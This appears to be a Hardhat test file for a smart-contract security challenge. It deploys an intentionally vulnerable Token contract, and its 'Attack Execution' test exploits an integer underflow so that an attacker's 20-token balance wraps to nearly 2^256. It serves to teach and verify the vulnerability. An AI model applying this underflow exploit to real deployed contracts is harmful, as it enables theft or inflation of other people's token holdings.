const {ethers} = require("hardhat")
const {expect} = require("chai")
const {loadFixture} = require("@nomicfoundation/hardhat-network-helpers")

describe("Challenge 5 - Token", function() {
    const initialTokenSupply = "21000000"
    const initialUserSupply = "20"

    async function deployContractFixture() {
        const [deployer, maliciousUser, maliciousUser2] = await ethers.getSigners()
        const Token = await ethers.getContractFactory("Token")
        const vulnerableContract = await Token.deploy(ethers.utils.parseEther(initialTokenSupply))
        await vulnerableContract.deployed()

        //send initial tokens to user
        const tx = await vulnerableContract.transfer(
            maliciousUser.address,
            ethers.utils.parseEther(initialUserSupply))
        await tx.wait()

        return {deployer, maliciousUser, maliciousUser2, vulnerableContract}
    }

    describe("Initial State", function() {
        it("Should deploy contract with correct deployer", async function() {
            const {deployer, vulnerableContract} = await loadFixture(deployContractFixture)

            expect(vulnerableContract.deployTransaction.from).to.equal(deployer.address)
        })

        it("Should set correct deployer token amount", async function() {
            const {deployer, vulnerableContract} = await loadFixture(deployContractFixture)

            expect(await vulnerableContract.balanceOf(deployer.address)).to.equal(
                ethers.utils.parseEther(initialTokenSupply).sub(ethers.utils.parseEther(initialUserSupply)))
        })

        it("Should set correct attacker token amount", async function() {
            const {maliciousUser, vulnerableContract} = await loadFixture(deployContractFixture)

            expect(await vulnerableContract.balanceOf(maliciousUser.address)).to.equal(
                ethers.utils.parseEther(initialUserSupply))
        })
    })

    describe("Attack Execution", function() {
        it("Should increase attacker balance", async function() {
            const {maliciousUser, maliciousUser2, vulnerableContract} = await loadFixture(deployContractFixture)

            //transfer malicious user's total balacnce plus some extra value;
            //This will cause an underflow and malucious user's value will be around 2^256-1
            const maliciousUserBalance = await vulnerableContract.balanceOf(maliciousUser.address)

            const tx = await vulnerableContract.connect(maliciousUser).transfer(
                maliciousUser2.address,
                maliciousUserBalance.add(ethers.utils.parseEther("1")))
            await tx.wait()

            expect(await vulnerableContract.balanceOf(maliciousUser.address)).to.be.greaterThan(
                ethers.utils.parseEther(initialTokenSupply))

            expect(await vulnerableContract.balanceOf(maliciousUser.address)).to.be.equal(
                "115792089237316195423570985008687907853269984665640564039456584007913129639936"
            )
    
        })
    })
})
